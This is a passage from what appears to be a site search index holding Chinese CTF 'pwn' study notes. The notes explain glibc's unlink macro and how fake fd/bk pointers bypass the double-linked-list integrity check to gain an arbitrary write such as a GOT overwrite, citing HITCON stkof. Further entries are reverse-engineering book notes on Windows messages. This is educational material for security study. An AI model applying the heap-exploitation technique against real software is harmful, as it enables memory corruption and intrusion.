addr)\uff0c\u82e5\u4e3aGOT\u8868\u9879\u5219\u4e0d\u53ef\u80fd\u7b49\u4e8eP\uff0c\u56e0\u6b64\u51fa\u9519\u3002\u4f46\u65e2\u7136\u53ea\u662f\u5730\u5740\u6bd4\u8f83\uff0c\u90a3\u6211\u4eec\u53ea\u8981\u627e\uff08\u6216\u8005\u4f2a\u9020\uff09\u4e00\u4e2a\u5730\u5740\uff0c\u91cc\u9762\u5b58\u7740P\u7684\u5730\u5740\u4e0d\u5c31\u89e3\u51b3\u4e86\uff1f\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u8fd9\u6837\u7ed5\u8fc7\u68c0\u6d4b\u673a\u5236\uff1a \u5148\u5b9a\u4e49 chunk1->fd=fakeFD\uff0cchunk1->bk=fakeBK\uff0c*Q=P \u7136\u540e\u6784\u9020\u4f7f\u5f97 fakeFD->bk==P \uff0c\u5373`*(fakeFD+12)=P\uff0cQ=fakeFD+12`` fakeBK->fd=P \uff0c\u5373`*(fakeBK+8)=P\uff0cQ=fakeBK+8`` \u5730\u5740 \u503c +00: fakeFD +04: fakeBK +08 +12: Q P \u8fd9\u6837\u4fbf\u6ee1\u8db3\u6761\u4ef6\uff0c\u7ed5\u8fc7\u4e86\u68c0\u6d4b\u673a\u5236\uff0c\u4ece\u800c\u8c03\u7528unlink\u5b8f\uff1a fakeFD->bk=fakeBK \uff0c\u5373 *(fakeFD+12)=fakeBK fakeBK->fd=fakeFD \uff0c\u5373 *(fakeBK+8)=fakeFD \u53c8\u7531\u4e0a\u9762\u7684\u6784\u9020\u6761\u4ef6\u53ef\u5f97\uff1a *Q=Q-8 *Q=Q-12 \u81f3\u6b64\uff0cQ\u5904\u7684\u503c\u88ab\u6539\u4e3aQ-12\u3002 PS\uff1a\u4ee5\u4e0a\u90fd\u662f\u4ee532\u4f4d\u7cfb\u7edf\u4e3a\u524d\u63d0\uff0c\u82e5\u4e3a64\u4f4d\u7cfb\u7edf\uff0c\u5219\u504f\u79fb\u76f8\u5e94\u8981\u4fee\u6539\uff0c\u5982+12\u53d8\u4e3a+0x18\uff0c+8\u53d8\u4e3a+0x10\u3002 \u5bf9\u5e94\u9898\u76ee\uff1a 2014HITCON stkof \u53c2\u8003\u8d44\u6599\uff1a CTF-Wiki Unlink","title":"\u6d45\u8c08glibc-unlink"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/\u6d45\u8c08glibc-unlink/#unlink","text":"unlink\u5c31\u662f\u628a\u4e00\u4e2a\u7a7a\u95f2chunk\u4ece\u53cc\u5411\u94fe\u8868\uff08\u5982small bin\uff09\u4e2d\u62ff\u51fa\u6765\uff0c\u4f8b\u5982\u5206\u914d\u65b0chunk\uff0c\u6216\u662ffree(p)\u65f6\u548cp\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2chunk\u4f1a\u548cp\u8fdb\u884c\u524d/\u540e\u5411\u5408\u5e76\uff08\u672c\u6587\u4e3b\u8981\u8bb2\u8fd9\u79cd\uff09\u3002unlink\u7684\u57fa\u672c\u8fc7\u7a0b\u5982\u4e0b\uff08\u56fe\u6765\u81eactf-wiki\uff09\uff1a \u5f53\u6709\u7269\u7406\u5730\u5740\u76f8\u90bb\u7684\u4e24\u4e2achunk\uff0c\u6309\u5730\u5740\u4ece\u4f4e\u5230\u9ad8chunk1-chunk2\uff0c\u5176\u4e2dchunk1\u662f\u7a7a\u95f2\u72b6\u6001\uff0cchunk2\u662f\u5206\u914d\u72b6\u6001\uff0c\u4e14chunk2\u4e3asmall chunk\uff08large chunk\u4f3c\u4e4e\u4e5f\u53ef\u4ee5\uff0c\u4ee5\u540e\u518d\u7814\u7a76\u4e0b\uff09\uff0c\u8fd9\u65f6\u5019\u6267\u884cfree(chunk2)\uff0c\u5c31\u4f1a\u8fdb\u884c\u5982\u4e0b\u68c0\u6d4b\uff1a","title":"\u4ec0\u4e48\u662funlink\uff1f"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/\u6d45\u8c08glibc-unlink/#_1","text":"\u68c0\u6d4bchunk2\u7684prev_in_use\u4f4d\uff0c\u770bchunk1\u662f\u5426\u4e3a\u7a7a\u95f2\uff0c\u82e5\u4e3a\u7a7a\u95f2\uff0c\u5219\u4e24\u4e2achunk\u5185\u5b58\u5408\u5e76\uff0c\u6307\u5411chunk2\u7684\u6307\u9488\u6539\u4e3a\u6307\u5411chunk1\uff0c\u63a5\u7740\u4f7f\u7528unlink\u5b8f\uff0c\u628achunk1\u4ece\u53cc\u5411\u94fe\u8868\u4e2d\u79fb\u9664\uff0cchunk1\u8fdb\u5165unsorted bin\u3002 if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( av , p , bck , fwd ); }","title":"\u540e\u5411\u5408\u5e76\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/\u6d45\u8c08glibc-unlink/#_2","text":"\u8ddf\u540e\u5411\u5408\u5e76\u539f\u7406\u76f8\u4f3c\uff0c\u68c0\u6d4bchunk2\u7684\u4e0b\u4e2achunk\uff08chunk3\uff0c\u7269\u7406\u5730\u5740\u6bd4chunk2\u9ad8\uff09\u662f\u5426\u4e3a\u7a7a\u95f2\uff0c\u7a7a\u95f2\u5219\u5408\u5e76\uff0c\u89e6\u53d1unlink\u5b8f\uff0c\u628achunk3\u4ece\u53cc\u5411\u94fe\u8868\u4e2d\u79fb\u9664\u3002","title":"\u524d\u5411\u5408\u5e76\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/\u6d45\u8c08glibc-unlink/#_3","text":"","title":"\u5229\u7528\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/\u6d45\u8c08glibc-unlink/#_4","text":"\u4e86\u89e3\u4e86unlink\u7684\u89e6\u53d1\u673a\u5236\u540e\uff0c\u6211\u4eec\u5c31\u8981\u60f3\u600e\u4e48\u5229\u7528\u5b83\u4e86\u3002\u663e\u7136\uff0c\u8981\u628achunk1\u4ece\u94fe\u8868\u4e2d\u79fb\u9664\uff0c\u6700\u91cd\u8981\u7684\u5c31\u662ffd\u548cbk\u6307\u9488\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u4ece\u5b83\u4e0b\u624b\u3002\u56de\u5230\u4e0a\u9762\u7684\u56fe\u4e2d\uff0c\u6211\u4eec\u6784\u9020\uff1a\uff08P\u4e3achunk1\u5730\u5740\uff09 FD=P->fd = target addr -12 BK=P->bk = expect value \u6839\u636eunlink\u5b8f\uff0c\u4f1a\u6709\u4ee5\u4e0b\u64cd\u4f5c\uff1a FD->bk = BK \uff0c\u5373 FD->bk= *(target addr-12+12)=BK=expect value \uff0c\u5373 *(target addr)=expect value BK->fd = FD \uff0c\u5373 *(expect value +8) = FD = target addr-12 \u7531\u6b64\u53ef\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\uff0c\u4f8b\u5982\u4fee\u6539GOT\u8868\u9879\u3002\u867d\u7136expect value +8\u5730\u5740\u7684\u503c\u88ab\u8986\u76d6\u4e86\u6709\u53ef\u80fd\u6709\u5c0f\u95ee\u9898\u3002","title":"\u7406\u60f3\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/\u6d45\u8c08glibc-unlink/#_5","text":"\u7406\u60f3\u5f88\u4e30\u6ee1\uff0c\u73b0\u5b9e\u5f88\u9aa8\u611f\uff0c\u600e\u4e48\u53ef\u80fd\u968f\u968f\u4fbf\u4fbf\u5c31\u8ba9\u4f60\u5229\u7528\u3002\u3002\u3002\u5b9e\u9645\u4e0a\uff0c\u5728glibc\u4e2d\u8fd8\u6709\u8fd9\u4e2a\u68c0\u6d4b\u673a\u5236\uff1a if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \u6309\u7167\u4e0a\u9762\u6784\u9020\uff0c\u5219\u6709FD->bk=*(target addr)\uff0c\u82e5\u4e3aGOT\u8868\u9879\u5219\u4e0d\u53ef\u80fd\u7b49\u4e8eP\uff0c\u56e0\u6b64\u51fa\u9519\u3002\u4f46\u65e2\u7136\u53ea\u662f\u5730\u5740\u6bd4\u8f83\uff0c\u90a3\u6211\u4eec\u53ea\u8981\u627e\uff08\u6216\u8005\u4f2a\u9020\uff09\u4e00\u4e2a\u5730\u5740\uff0c\u91cc\u9762\u5b58\u7740P\u7684\u5730\u5740\u4e0d\u5c31\u89e3\u51b3\u4e86\uff1f\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u8fd9\u6837\u7ed5\u8fc7\u68c0\u6d4b\u673a\u5236\uff1a \u5148\u5b9a\u4e49 chunk1->fd=fakeFD\uff0cchunk1->bk=fakeBK\uff0c*Q=P \u7136\u540e\u6784\u9020\u4f7f\u5f97 fakeFD->bk==P \uff0c\u5373`*(fakeFD+12)=P\uff0cQ=fakeFD+12`` fakeBK->fd=P \uff0c\u5373`*(fakeBK+8)=P\uff0cQ=fakeBK+8`` \u5730\u5740 \u503c +00: fakeFD +04: fakeBK +08 +12: Q P \u8fd9\u6837\u4fbf\u6ee1\u8db3\u6761\u4ef6\uff0c\u7ed5\u8fc7\u4e86\u68c0\u6d4b\u673a\u5236\uff0c\u4ece\u800c\u8c03\u7528unlink\u5b8f\uff1a fakeFD->bk=fakeBK \uff0c\u5373 *(fakeFD+12)=fakeBK fakeBK->fd=fakeFD \uff0c\u5373 *(fakeBK+8)=fakeFD \u53c8\u7531\u4e0a\u9762\u7684\u6784\u9020\u6761\u4ef6\u53ef\u5f97\uff1a *Q=Q-8 *Q=Q-12 \u81f3\u6b64\uff0cQ\u5904\u7684\u503c\u88ab\u6539\u4e3aQ-12\u3002 PS\uff1a\u4ee5\u4e0a\u90fd\u662f\u4ee532\u4f4d\u7cfb\u7edf\u4e3a\u524d\u63d0\uff0c\u82e5\u4e3a64\u4f4d\u7cfb\u7edf\uff0c\u5219\u504f\u79fb\u76f8\u5e94\u8981\u4fee\u6539\uff0c\u5982+12\u53d8\u4e3a+0x18\uff0c+8\u53d8\u4e3a+0x10\u3002 \u5bf9\u5e94\u9898\u76ee\uff1a 2014HITCON stkof \u53c2\u8003\u8d44\u6599\uff1a CTF-Wiki Unlink","title":"\u73b0\u5b9e\uff1a"},{"location":"\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u5b66\u4e60\u7b14\u8bb0/\u524d\u8a00/","text":"\u524d\u8a00 \u00b6 \u4e4b\u524d\u4e00\u76f4\u505a\u7684\u662flinux pwn\uff0c\u4ece\u6765\u6ca1\u63a5\u89e6\u8fc7winpwn\u3002\u6700\u8fd1\u7684\u6bd4\u8d5bwinpwn\u51fa\u73b0\u7684\u8d8a\u6765\u8d8a\u591a\uff0c\u4f46\u662f\u7531\u4e8e\u5bf9PE\u6587\u4ef6\u683c\u5f0f\u4e0d\u4e86\u89e3\u5bfc\u81f4\u8fdewriteup\u7406\u89e3\u8d77\u6765\u90fd\u5403\u529b\u3002\u6b63\u597d\u4e4b\u524d\u7684\u300a\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u300b\u6ca1\u600e\u4e48\u770b\uff0c\u800c\u4e14\u5de5\u4f5c\u4e0a\u4e5f\u9700\u8981\u8ddfPE\u6587\u4ef6\u6253\u4ea4\u9053\uff0c\u56e0\u6b64\u51b3\u5b9a\u4ece\u5934\u5f00\u59cb\u5b66\u4e60\u300a\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u300b\uff0c\u6bcf\u4e00\u7ae0\u8fdb\u884c\u7b14\u8bb0\u8bb0\u5f55\u3002","title":"\u524d\u8a00"},{"location":"\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u5b66\u4e60\u7b14\u8bb0/\u524d\u8a00/#_1","text":"\u4e4b\u524d\u4e00\u76f4\u505a\u7684\u662flinux pwn\uff0c\u4ece\u6765\u6ca1\u63a5\u89e6\u8fc7winpwn\u3002\u6700\u8fd1\u7684\u6bd4\u8d5bwinpwn\u51fa\u73b0\u7684\u8d8a\u6765\u8d8a\u591a\uff0c\u4f46\u662f\u7531\u4e8e\u5bf9PE\u6587\u4ef6\u683c\u5f0f\u4e0d\u4e86\u89e3\u5bfc\u81f4\u8fdewriteup\u7406\u89e3\u8d77\u6765\u90fd\u5403\u529b\u3002\u6b63\u597d\u4e4b\u524d\u7684\u300a\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u300b\u6ca1\u600e\u4e48\u770b\uff0c\u800c\u4e14\u5de5\u4f5c\u4e0a\u4e5f\u9700\u8981\u8ddfPE\u6587\u4ef6\u6253\u4ea4\u9053\uff0c\u56e0\u6b64\u51b3\u5b9a\u4ece\u5934\u5f00\u59cb\u5b66\u4e60\u300a\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u300b\uff0c\u6bcf\u4e00\u7ae0\u8fdb\u884c\u7b14\u8bb0\u8bb0\u5f55\u3002","title":"\u524d\u8a00"},{"location":"\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u5b66\u4e60\u7b14\u8bb0/\u7b2c1\u7ae0 \u57fa\u7840\u77e5\u8bc6/","text":"\u7b2c1\u7ae0 \u57fa\u7840\u77e5\u8bc6 \u00b6 \u5b57\u7b26 \u00b6 Unicode\uff08\u5bbd\u5b57\u7b26\u96c6\uff09\uff0c\u4e00\u4e2a\u5b57\u7b262\u5b57\u8282 ASCII\uff0c\u4e00\u4e2a\u5b57\u7b261\u5b57\u8282 API\u51fd\u6570\u4e2dA\u7ed3\u5c3e\u4e3aANSI\u7248\uff0cW\u7ed3\u5c3e\u4e3a\u5bbd\u5b57\u7b26\u7248 \u6d88\u606f\u51fd\u6570 \u00b6 \u5bf9Windows\u7f16\u7a0b\u771f\u662f\u592a\u4e0d\u4e86\u89e3\u4e86\uff0c\u7559\u5751\u300aWindows\u7a0b\u5e8f\u8bbe\u8ba1\u300b\uff0c\u4ee5\u540e\u5b66\u4e60\u586b\u3002 SendMessage\uff1a\u5c06\u4e00\u6761\u6d88\u606f\u53d1\u7ed9\u76ee\u7684\u7a97\u53e3\uff0c\u6d88\u606f\u5904\u7406\u5b8c\u6bd5\u51fd\u6570\u624d\u4f1a\u8fd4\u56de\uff0c\u6d88\u606f\u6295\u9012\u6210\u529f\u8fd4\u56deTRUE WM_COMMAND\uff080x111\uff09\uff1a\u7528\u6237\u4ece\u83dc\u5355\u6216\u6309\u94ae\u4e2d\u9009\u62e9\u4e00\u6761\u547d\u4ee4\u6216\u8005\u4e00\u4e2a\u63a7\u4ef6\u65f6\u8be5\u6d88\u606f\u88ab\u53d1\u9001\u7ed9\u5b83\u7684\u7236\u7a97\u53e3 WM_DESTROY\uff080x02\uff09\uff1a\u7a97\u53e3\u88ab\u9500\u6bc1\u65f6\u53d1\u9001 WM_GETTEXT\uff080x0D\uff09\uff1a\u5e94\u7528\u7a0b\u5e8f\u53d1\u9001\u4e00\u6761WM_GETTEXT\u6d88\u606f\uff0c\u5c06\u4e00\u4e2a\u5bf9\u5e94\u7a97\u53e3\u7684\u6587\u672c\u590d\u5236\u5230\u4e00\u4e2a\u7531\u547c\u53eb\u7a0b\u5e8f\u63d0\u4f9b\u7684\u7f13\u51b2\u533a\u4e2d WM_QUIT\uff080x12\uff09\uff1a\u5e94\u7528\u7a0b\u5e8f\u8c03\u7528PostQuitMessage\u51fd\u6570\u65f6\u4f1a\u751f\u6210WM_QUIT\u6d88\u606f WM_LBUTTONDOWN\uff080x201\uff09\uff1a\u7528\u6237\u6309\u4e0b\u9f20\u6807\u5de6\u952e\u53d1\u9001\u6b64\u6d88\u606f","title":"\u7b2c1\u7ae0 \u57fa\u7840\u77e5\u8bc6"},{"location":"\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u5b66\u4e60\u7b14\u8bb0/\u7b2c1\u7ae0 \u57fa\u7840\u77e5\u8bc6/#1","text":"","title":"\u7b2c1\u7ae0 \u57fa\u7840\u77e5\u8bc6"},{"location":"\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u5b66\u4e60\u7b14\u8bb0/\u7b2c1\u7ae0 \u57fa\u7840\u77e5\u8bc6/#_1","text":"Unicode\uff08\u5bbd\u5b57\u7b26\u96c6\uff09\uff0c\u4e00\u4e2a\u5b57\u7b262\u5b57\u8282 ASCII\uff0c\u4e00\u4e2a\u5b57\u7b261\u5b57\u8282 API\u51fd\u6570\u4e2dA\u7ed3\u5c3e\u4e3aANSI\u7248\uff0cW\u7ed3\u5c3e\u4e3a\u5bbd\u5b57\u7b26\u7248","title":"\u5b57\u7b26"},{"location":"\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u5b66\u4e60\u7b14\u8bb0/\u7b2c1\u7ae0 \u57fa\u7840\u77e5\u8bc6/#_2","text":"\u5bf9Windows\u7f16\u7a0b\u771f\u662f\u592a\u4e0d\u4e86\u89e3\u4e86\uff0c\u7559\u5751\u300aWindows\u7a0b\u5e8f\u8bbe\u8ba1\u300b\uff0c\u4ee5\u540e\u5b66\u4e60\u586b\u3002 SendMessage\uff1a\u5c06\u4e00\u6761\u6d88\u606f\u53d1\u7ed9\u76ee\u7684\u7a97\u53e3\uff0c\u6d88\u606f\u5904\u7406\u5b8c\u6bd5\u51fd\u6570\u624d\u4f1a\u8fd4\u56de\uff0c\u6d88\u606f\u6295\u9012\u6210\u529f\u8fd4\u56deTRUE WM_COMMAND\uff080x111\uff09\uff1a\u7528\u6237\u4ece\u83dc\u5355\u6216\u6309\u94ae\u4e2d\u9009\u62e9\u4e00\u6761\u547d\u4ee4\u6216\u8005\u4e00\u4e2a\u63a7\u4ef6\u65f6\u8be5\u6d88\u606f\u88ab\u53d1\u9001\u7ed9\u5b83\u7684\u7236\u7a97\u53e3 WM_DESTROY\uff080x02\uff09\uff1a\u7a97\u53e3\u88ab\u9500\u6bc1\u65f6\u53d1\u9001 WM_GETTEXT\uff080x0D\uff09\uff1a\u5e94\u7528\u7a0b\u5e8f\u53d1\u9001\u4e00\u6761WM_GETTEXT\u6d88\u606f\uff0c\u5c06\u4e00\u4e2a\u5bf9\u5e94\u7a97\u53e3\u7684\u6587\u672c\u590d\u5236\u5230\u4e00\u4e2a\u7531\u547c\u53eb\u7a0b\u5e8f\u63d0\u4f9b\u7684\u7f13\u51b2\u533a\u4e2d WM_QUIT\uff080x12\uff09\uff1a\u5e94\u7528\u7a0b\u5e8f\u8c03\u7528PostQuitMessage\u51fd\u6570\u65f6\u4f1a\u751f\u6210WM_QUIT\u6d88\u606f WM_LBUTTONDOWN\uff080x201\uff09\uff1a\u7528\u6237\u6309\u4e0b\u9f20\u6807\u5de6\u952e\u53d1\u9001\u6b64\u6d88\u606f","title":"\u6d88\u606f\u51fd\u6570"},{"location":"\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u5b66\u4e60\u7b14\u8bb0/\u7b2c2\u7ae0 \u52a8\u6001\u5206\u6790\u6280\u672f/","text":"\u7b2c2\u7ae0 \u52a8\u6001\u5206\u6790\u6280\u672f \u00b6","title":"\u7b2c2\u7ae0 \u52a8\u6001\u5206\u6790\u6280\u672f"},{"location":"\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u5b66\u4e60\u7b14\u8bb0/\u7b2c2\u7ae0 \u52a8\u6001\u5206\u6790\u6280\u672f/#2","text":"","title":"\u7b2c2\u7ae0 \u52a8\u6001\u5206\u6790\u6280\u672f"}]}